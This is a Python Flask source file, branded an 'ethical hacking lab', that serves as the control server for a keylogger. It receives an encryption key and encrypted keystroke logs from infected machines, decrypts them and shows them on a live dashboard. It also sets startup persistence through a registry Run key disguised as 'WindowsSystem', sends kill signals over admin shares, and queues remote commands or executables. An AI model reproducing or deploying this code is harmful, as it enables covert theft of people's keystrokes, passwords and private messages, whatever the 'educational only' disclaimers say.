#!/usr/bin/env python3
"""
Python Flask Server - Keylogger Data Handler
Enhanced version with integrated control panel and real-time status
"""

import sys
import subprocess
import os
from datetime import datetime, timedelta
from pathlib import Path
import base64
import platform
import webbrowser
import threading
import time

def install_dependencies():
    """Install required dependencies if not already installed."""
    try:
        import flask
        import flask.json
        from cryptography.fernet import Fernet
        print("Dependencies already installed.")
    except ImportError:
        print("Installing required dependencies...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "flask", "cryptography", "--quiet"])
            print("Dependencies installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Error installing dependencies: {e}")
            sys.exit(1)

# Install dependencies first
install_dependencies()

# Now import Flask after ensuring it's installed
from flask import Flask, request, send_from_directory, jsonify
from cryptography.fernet import Fernet

# Create Flask app
app = Flask(__name__)

# Define the port
PORT = 8080

# Define the logs directory
LOGS_DIR = "received logs"
DECRYPTED_LOGS_DIR = os.path.join(LOGS_DIR, "decrypted logs")

# Create logs directories if they don't exist
os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(DECRYPTED_LOGS_DIR, exist_ok=True)

# Global variables for key management
fernet_instance = None
encryption_key = None
key_received = False
decrypted_logs_buffer = []
command_queue = []
last_log_time = None

def receive_and_load_key(key_data):
    """Receive and load encryption key from keylogger"""
    global fernet_instance, encryption_key, key_received
    
    try:
        # Decode the base64 key
        encryption_key = base64.b64decode(key_data)
        fernet_instance = Fernet(encryption_key)
        
        # Save the key to file
        key_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "decryption_key.key")
        with open(key_file_path, 'wb') as key_file:
            key_file.write(encryption_key)
        
        key_received = True
        print(f"[!] Encryption key received and saved successfully!")
        return True
    except Exception as e:
        print(f"[!] Error receiving key: {e}")
        return False

def get_decrypted_logs():
    """Get all decrypted logs"""
    global decrypted_logs_buffer
    return decrypted_logs_buffer

def get_log_filename():
    """
    Generate a log filename based on the current date.
    Format: YYYY-MM-DD_keyboard_capture.txt
    """
    current_date = datetime.now().strftime("%Y-%m-%d")
    return os.path.join(LOGS_DIR, f"{current_date}_keyboard_capture.txt")

def get_decrypted_log_filename():
    """
    Generate a decrypted log filename based on the current date.
    Format: YYYY-MM-DD_keyboard_capture_decrypted.txt
    """
    current_date = datetime.now().strftime("%Y-%m-%d")
    return os.path.join(DECRYPTED_LOGS_DIR, f"{current_date}_keyboard_capture_decrypted.txt")

@app.route('/', methods=['GET'])
def get_keyboard_data():
    """Main page - Integrated Control Panel and Logs"""
    global decrypted_logs_buffer, last_log_time
    
    # Get recent logs
    logs_html = ""
    if decrypted_logs_buffer:
        logs_html = '<br>'.join(decrypted_logs_buffer[-50:])  # Show last 50 entries
    else:
        logs_html = '<span style="color: #666;">No logs received yet...</span>'
    
    # Determine status
    status_color = "#00ff41"  # Green by default
    status_text = "ONLINE"
    
    if last_log_time:
        time_diff = datetime.now() - last_log_time
        if time_diff > timedelta(minutes=5):
            status_color = "#ff0044"  # Red
            status_text = "OFFLINE"
    elif not decrypted_logs_buffer:
        status_color = "#ffaa00"  # Orange
        status_text = "WAITING"
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ethical Hacking Lab - Diwakar</title>
        <meta charset="UTF-8">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
            
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            
            body {{
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                color: #00ff41;
                font-family: 'Share Tech Mono', monospace;
                min-height: 100vh;
                overflow-x: hidden;
            }}
            
            .container {{
                position: relative;
                z-index: 1;
                max-width: 1600px;
                margin: 0 auto;
                padding: 20px;
            }}
            
            .header {{
                text-align: center;
                padding: 20px;
                border-bottom: 2px solid #00ff41;
                margin-bottom: 30px;
                position: relative;
            }}
            
            .title {{
                font-family: 'Orbitron', sans-serif;
                font-size: 3em;
                font-weight: 900;
                color: #00ff41;
                text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
                margin-bottom: 10px;
                letter-spacing: 3px;
            }}
            
            .subtitle {{
                font-size: 1.2em;
                color: #00ff88;
                letter-spacing: 2px;
            }}
            
            .status-indicator {{
                display: inline-flex;
                align-items: center;
                gap: 10px;
                padding: 8px 20px;
                background: rgba(0, 0, 0, 0.5);
                border: 2px solid {status_color};
                border-radius: 25px;
                margin: 10px;
                cursor: default;
            }}
            
            .status-light {{
                width: 15px;
                height: 15px;
                border-radius: 50%;
                background: {status_color};
                box-shadow: 0 0 15px {status_color};
                animation: pulse 2s infinite;
            }}
            
            .status-text {{
                color: {status_color};
                font-weight: bold;
                font-family: 'Orbitron', sans-serif;
            }}
            
            @keyframes pulse {{
                0%, 100% {{ opacity: 1; transform: scale(1); }}
                50% {{ opacity: 0.7; transform: scale(1.1); }}
            }}
            
            .warning {{
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #ff0000;
                padding: 15px;
                margin: 20px 0;
                border-radius: 5px;
                font-size: 0.85em;
                line-height: 1.5;
            }}
            
            .warning h3 {{
                color: #ff4444;
                margin-bottom: 8px;
                font-size: 1.1em;
                text-shadow: 0 0 5px #ff0000;
            }}
            
            .content-grid {{
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 20px;
                margin: 20px 0;
            }}
            
            @media (max-width: 1200px) {{
                .content-grid {{
                    grid-template-columns: 1fr;
                }}
            }}
            
            .control-panel {{
                background: rgba(0, 0, 0, 0.7);
                border: 2px solid #00ff41;
                border-radius: 5px;
                padding: 20px;
                box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
            }}
            
            .control-title {{
                color: #00ff41;
                font-size: 1.5em;
                margin-bottom: 20px;
                font-family: 'Orbitron', sans-serif;
                text-align: center;
                border-bottom: 1px solid #00ff41;
                padding-bottom: 10px;
            }}
            
            .control-section {{
                margin: 15px 0;
                padding: 15px;
                background: rgba(0, 255, 65, 0.05);
                border-left: 3px solid #00ff41;
                border-radius: 3px;
            }}
            
            .control-section h4 {{
                color: #00ff88;
                margin-bottom: 10px;
                font-size: 1em;
            }}
            
            .control-input {{
                width: 100%;
                padding: 10px;
                margin: 8px 0;
                background: rgba(0, 0, 0, 0.5);
                border: 1px solid #00ff41;
                color: #00ff41;
                border-radius: 3px;
                font-family: 'Share Tech Mono', monospace;
                font-size: 0.9em;
            }}
            
            .control-input:focus {{
                outline: none;
                border-color: #00ff88;
                box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
            }}
            
            .btn {{
                background: #00ff41;
                color: #000;
                border: none;
                padding: 10px 20px;
                font-size: 0.9em;
                font-weight: bold;
                cursor: pointer;
                border-radius: 3px;
                font-family: 'Orbitron', sans-serif;
                transition: all 0.3s;
                box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
                margin: 5px;
            }}
            
            .btn:hover {{
                background: #00cc33;
                box-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
                transform: translateY(-2px);
            }}
            
            .btn-danger {{
                background: #ff0044;
                box-shadow: 0 0 10px rgba(255, 0, 68, 0.5);
            }}
            
            .btn-danger:hover {{
                background: #cc0033;
                box-shadow: 0 0 20px rgba(255, 0, 68, 0.8);
            }}
            
            .btn-info {{
                background: #2196F3;
                box-shadow: 0 0 10px rgba(33, 150, 243, 0.5);
            }}
            
            .btn-info:hover {{
                background: #0b7dda;
                box-shadow: 0 0 20px rgba(33, 150, 243, 0.8);
            }}
            
            .logs-container {{
                background: rgba(0, 0, 0, 0.7);
                border: 2px solid #00ff41;
                border-radius: 5px;
                padding: 20px;
                max-height: 600px;
                overflow-y: auto;
                box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
            }}
            
            .logs-container::-webkit-scrollbar {{
                width: 10px;
            }}
            
            .logs-container::-webkit-scrollbar-track {{
                background: #1a1a1a;
                border-radius: 5px;
            }}
            
            .logs-container::-webkit-scrollbar-thumb {{
                background: #00ff41;
                border-radius: 5px;
            }}
            
            .log-entry {{
                color: #00ff88;
                margin: 5px 0;
                padding: 5px;
                border-left: 2px solid #00ff41;
                padding-left: 10px;
                font-size: 0.85em;
            }}
            
            .result {{
                margin-top: 10px;
                padding: 10px;
                border-radius: 3px;
                font-size: 0.85em;
                display: none;
            }}
            
            .result.success {{
                background: rgba(0, 255, 65, 0.2);
                color: #00ff88;
                border: 1px solid #00ff41;
            }}
            
            .result.error {{
                background: rgba(255, 0, 68, 0.2);
                color: #ff6688;
                border: 1px solid #ff0044;
            }}
            
            .footer {{
                text-align: center;
                padding: 20px;
                margin-top: 30px;
                border-top: 2px solid #00ff41;
                color: #00ff88;
                font-size: 0.9em;
            }}
            
            .refresh-btn {{
                position: fixed;
                bottom: 30px;
                right: 30px;
                background: #00ff41;
                color: #000;
                border: none;
                padding: 15px;
                border-radius: 50%;
                cursor: pointer;
                font-size: 1.2em;
                box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
                transition: all 0.3s;
                z-index: 1000;
            }}
            
            .refresh-btn:hover {{
                transform: scale(1.1) rotate(180deg);
                box-shadow: 0 0 30px rgba(0, 255, 65, 0.8);
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="title">[ ETHICAL HACKING LAB ]</div>
                <div class="subtitle">KEYLOGGER MONITORING SYSTEM v1.0</div>
                <div style="margin-top: 15px;">
                    <div class="status-indicator">
                        <div class="status-light"></div>
                        <span class="status-text">STATUS: {status_text}</span>
                    </div>
                    <span style="color: #888;">Developer: DIWAKAR</span>
                </div>
            </div>
            
            <div class="warning">
                <h3>⚠️ LEGAL & ETHICAL WARNING</h3>
                <p>
                    <strong>This tool is for EDUCATIONAL PURPOSES ONLY.</strong>
                    Unauthorized access to computer systems is illegal and unethical.
                    Only use this tool on systems you own or have explicit written permission to test.
                    The developer (Diwakar) and contributors are not responsible for any misuse of this software.
                </p>
            </div>
            
            <div class="content-grid">
                <div class="control-panel">
                    <div class="control-title">⚙️ CONTROL PANEL</div>
                    
                    <div class="control-section">
                        <h4>🔧 Startup Control</h4>
                        <input type="text" class="control-input" id="scriptPath" 
                               placeholder="Script Path (e.g., C:\\Windows\\SystemTemp\\keylogger.exe)"
                               value="C:\\Windows\\SystemTemp\\keylogger.exe">
                        <div>
                            <button class="btn" onclick="enableStartup()">✓ Enable Startup</button>
                            <button class="btn btn-danger" onclick="disableStartup()">✗ Disable Startup</button>
                        </div>
                        <div id="startupResult" class="result"></div>
                    </div>
                    
                    <div class="control-section">
                        <h4>🛑 Kill Switch</h4>
                        <input type="text" class="control-input" id="ipAddress" 
                               placeholder="Target IP (e.g., 192.168.1.100 or 127.0.0.1)"
                               value="127.0.0.1">
                        <div>
                            <button class="btn btn-danger" onclick="killKeylogger()">⚠ Kill Keylogger</button>
                        </div>
                        <div id="killResult" class="result"></div>
                    </div>
                    
                    <div class="control-section">
                        <h4>📊 System Information</h4>
                        <div>
                            <button class="btn btn-info" onclick="getStatus()">View API Status</button>
                        </div>
                        <div id="statusResult" class="result"></div>
                    </div>
                </div>
                
                <div class="logs-container">
                    <h3 style="color: #00ff41; margin-bottom: 15px;">📡 LIVE TRANSMISSION LOGS</h3>
                    <div class="log-entry">{logs_html}</div>
                </div>
            </div>
            
            <div class="footer">
                <p>© 2025 Ethical Hacking Lab - Developed by <strong style="color: #00ff41;">DIWAKAR</strong></p>
                <p style="font-size: 0.8em; color: #666; margin-top: 5px;">
                    Educational Purpose Only | Not for Production Use | Use Responsibly
                </p>
            </div>
        </div>
        
        <button class="refresh-btn" onclick="location.reload()" title="Refresh Page">🔄</button>
        
        <script>
            // Auto-refresh every 5 seconds
            setTimeout(() => location.reload(), 5000);
            
            function showResult(elementId, message, isSuccess) {{
                const result = document.getElementById(elementId);
                result.style.display = 'block';
                result.className = 'result ' + (isSuccess ? 'success' : 'error');
                result.textContent = message;
                
                setTimeout(() => {{
                    result.style.display = 'none';
                }}, 5000);
            }}
            
            async function getStatus() {{
                try {{
                    const response = await fetch('/control/status');
                    const data = await response.json();
                    showResult('statusResult', JSON.stringify(data, null, 2), true);
                }} catch (error) {{
                    showResult('statusResult', 'Error: ' + error.message, false);
                }}
            }}
            
            async function enableStartup() {{
                const path = document.getElementById('scriptPath').value;
                if (!path) {{
                    showResult('startupResult', 'Please enter script path', false);
                    return;
                }}
                
                try {{
                    const response = await fetch('/control/enable_startup', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{script_path: path}})
                    }});
                    const data = await response.json();
                    showResult('startupResult', data.message || JSON.stringify(data), response.ok);
                }} catch (error) {{
                    showResult('startupResult', 'Error: ' + error.message, false);
                }}
            }}
            
            async function disableStartup() {{
                try {{
                    const response = await fetch('/control/disable_startup', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{}})
                    }});
                    const data = await response.json();
                    showResult('startupResult', data.message || JSON.stringify(data), response.ok);
                }} catch (error) {{
                    showResult('startupResult', 'Error: ' + error.message, false);
                }}
            }}
            
            async function killKeylogger() {{
                const ip = document.getElementById('ipAddress').value || '127.0.0.1';
                
                if (!confirm('Are you sure you want to kill the keylogger?')) {{
                    return;
                }}
                
                try {{
                    const response = await fetch('/control/kill', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{ip_address: ip}})
                    }});
                    const data = await response.json();
                    showResult('killResult', data.message || JSON.stringify(data), response.ok);
                }} catch (error) {{
                    showResult('killResult', 'Error: ' + error.message, false);
                }}
            }}
        </script>
    </body>
    </html>
    """
    
    return html

@app.route('/control/status', methods=['GET'])
def get_status():
    """Get server status and available commands"""
    global last_log_time
    
    status_info = {
        "status": "running",
        "last_log_received": str(last_log_time) if last_log_time else "No logs yet",
        "total_logs": len(decrypted_logs_buffer),
        "encryption_key_loaded": fernet_instance is not None,
        "endpoints": {
            "GET /": "View logs and control panel",
            "POST /": "Receive encrypted keyboard data",
            "POST /send_key": "Receive encryption key",
            "POST /control/enable_startup": "Enable keylogger startup persistence",
            "POST /control/disable_startup": "Disable keylogger startup persistence",
            "POST /control/kill": "Send kill signal to keylogger",
            "GET /control/status": "Get this status information"
        },
        "directories": {
            "encrypted_logs": LOGS_DIR,
            "decrypted_logs": DECRYPTED_LOGS_DIR
        }
    }
    return jsonify(status_info)

@app.route('/control/enable_startup', methods=['POST'])
def enable_startup():
    """Endpoint to enable keylogger startup persistence"""
    try:
        if platform.system() == 'Windows':
            import winreg
        else:
            return jsonify({"error": "Startup control only works on Windows"}), 400
        
        data = request.get_json()
        script_path = data.get('script_path', '')
        
        if not script_path:
            return jsonify({"error": "script_path required"}), 400
        
        try:
            app_name = "WindowsSystem"
            
            if script_path.endswith('.py'):
                exe_path = f'"{sys.executable}" "{script_path}"'
            else:
                exe_path = f'"{script_path}"'
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
            return jsonify({"message": "Startup enabled successfully"}), 200
        except Exception as e:
            return jsonify({"error": f"Failed to enable startup: {str(e)}"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/control/disable_startup', methods=['POST'])
def disable_startup():
    """Endpoint to disable keylogger startup persistence"""
    try:
        if platform.system() == 'Windows':
            import winreg
        else:
            return jsonify({"error": "Startup control only works on Windows"}), 400
        
        try:
            app_name = "WindowsSystem"
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, app_name)
            winreg.CloseKey(key)
            
            return jsonify({"message": "Startup disabled successfully"}), 200
        except Exception as e:
            return jsonify({"error": f"Failed to disable startup: {str(e)}"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/control/kill', methods=['POST'])
def kill_keylogger():
    """Endpoint to remotely kill the keylogger"""
    try:
        data = request.get_json()
        target_ip = data.get('ip_address', '127.0.0.1')
        
        if platform.system() == 'Windows':
            kill_switch_file = f'\\\\{target_ip}\\C$\\Windows\\Temp\\kl_stop.signal'
            
            try:
                with open(kill_switch_file, 'w') as f:
                    f.write('STOP')
                return jsonify({"message": f"Kill signal sent to {target_ip}"}), 200
            except Exception as e:
                local_kill_file = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'kl_stop.signal')
                try:
                    with open(local_kill_file, 'w') as f:
                        f.write('STOP')
                    return jsonify({"message": "Kill signal sent locally"}), 200
                except Exception as e2:
                    return jsonify({"error": f"Failed to send kill signal: {str(e2)}"}), 500
        else:
            return jsonify({"error": "Kill switch only works on Windows"}), 400
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/send_key', methods=['POST'])
def receive_key():
    """Receive encryption key from keylogger"""
    global key_received, last_log_time
    
    try:
        data = request.get_json()
        
        if data and 'key' in data:
            key_data = data['key']
            
            if receive_and_load_key(key_data):
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                last_log_time = datetime.now()
                decrypted_logs_buffer.append(f"[{timestamp}] KEY RECEIVED: Encryption key successfully received from keylogger")
                
                return jsonify({
                    "status": "approved",
                    "message": "Key received successfully. You can now start sending logs."
                }), 200
            else:
                return jsonify({
                    "status": "error",
                    "message": "Failed to process encryption key"
                }), 400
        else:
            return jsonify({
                "status": "error",
                "message": "No key data provided"
            }), 400
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Error processing key: {str(e)}"
        }), 500

@app.route('/execute', methods=['POST'])
def send_execution_command():
    """Send executable command to keylogger"""
    global last_log_time
    
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "No data provided"}), 400
        
        executable_data = data.get('executable')
        command = data.get('command')
        
        if executable_data:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            last_log_time = datetime.now()
            decrypted_logs_buffer.append(f"[{timestamp}] COMMAND SENT: Executable file prepared for execution")
            
            return jsonify({
                "status": "ready",
                "executable": executable_data,
                "timestamp": timestamp
            }), 200
        elif command:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            last_log_time = datetime.now()
            decrypted_logs_buffer.append(f"[{timestamp}] COMMAND SENT: {command}")
            
            return jsonify({
                "status": "ready",
                "command": command,
                "timestamp": timestamp
            }), 200
        else:
            return jsonify({"error": "No executable or command provided"}), 400
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/', methods=['POST'])
def post_keyboard_data():
    """
    POST endpoint: Accepts encrypted keyboard data in JSON format, decrypts it, and saves both versions.
    """
    global fernet_instance, decrypted_logs_buffer, last_log_time
    
    try:
        data = request.get_json()
        
        if data and 'keyboardData' in data:
            encrypted_keyboard_data = data['keyboardData']
            
            # Update last log time
            last_log_time = datetime.now()
            
            # Save encrypted data to file
            encrypted_log_file = get_log_filename()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            with open(encrypted_log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {encrypted_keyboard_data}\n")
            
            # Try to decrypt the data
            decrypted_data = None
            try:
                encrypted_bytes = base64.b64decode(encrypted_keyboard_data)
                
                if fernet_instance:
                    decrypted_bytes = fernet_instance.decrypt(encrypted_bytes)
                    decrypted_data = decrypted_bytes.decode('utf-8')
                    
                    # Save decrypted data to file
                    decrypted_log_file = get_decrypted_log_filename()
                    with open(decrypted_log_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{timestamp}] {decrypted_data}\n")
                    
                    # Append to in-memory buffer for web UI
                    decrypted_logs_buffer.append(f"[{timestamp}] {decrypted_data}")
                    
                    # Keep only last 1000 entries
                    if len(decrypted_logs_buffer) > 1000:
                        decrypted_logs_buffer = decrypted_logs_buffer[-1000:]
                    
                    # Log to console
                    print(f"[{timestamp}] Decrypted: {decrypted_data}")
                else:
                    print(f"[{timestamp}] Encrypted data received but no decryption key available")
            except Exception as decrypt_error:
                print(f"[{timestamp}] Error decrypting data: {decrypt_error}")
            
            return "Successfully set the data"
        else:
            return "Error: 'keyboardData' field not found in request body", 400
    except Exception as e:
        return f"Error processing data: {str(e)}", 500


def open_browser():
    """Open browser after a short delay"""
    time.sleep(1.5)
    webbrowser.open(f'http://localhost:{PORT}/')


if __name__ == '__main__':
    print("\n" + "="*70)
    print(" " * 15 + "ETHICAL HACKING LAB - KEYLOGGER SERVER")
    print("="*70)
    print(f"\n{'✓ Server Starting on Port:':.<30} {PORT}")
    print(f"{'✓ Developer:':.<30} DIWAKAR")
    print(f"{'✓ Purpose:':.<30} EDUCATIONAL ONLY")
    print("\n" + "─"*70)
    print(" " * 15 + "🌐 WEB INTERFACE")
    print("─"*70)
    print(f"\n   👉 MAIN DASHBOARD: http://localhost:{PORT}/")
    print("\n" + "─"*70)
    print(" " * 15 + "⚠️ LEGAL WARNING")
    print("─"*70)
    print("   This tool is for EDUCATIONAL PURPOSES ONLY.")
    print("   Unauthorized access is ILLEGAL and UNETHICAL.")
    print("   Use only on systems you OWN or have PERMISSION to test.")
    print("\n" + "─"*70)
    print(" " * 15 + "📡 AVAILABLE ENDPOINTS")
    print("─"*70)
    print("   POST /send_key       - Receive encryption key from keylogger")
    print("   POST /               - Receive encrypted keyboard data")
    print("   POST /execute        - Send commands/executables to keylogger")
    print("   GET  /               - Main dashboard with integrated control panel")
    print("\n" + "="*70)
    print(" " * 20 + "🚀 LAUNCHING BROWSER...")
    print("="*70 + "\n")
    
    # Start browser in a separate thread
    browser_thread = threading.Thread(target=open_browser, daemon=True)
    browser_thread.start()
    
    # Run the Flask app (debug=False to avoid duplicate browser opening)
    app.run(host='0.0.0.0', port=PORT, debug=False)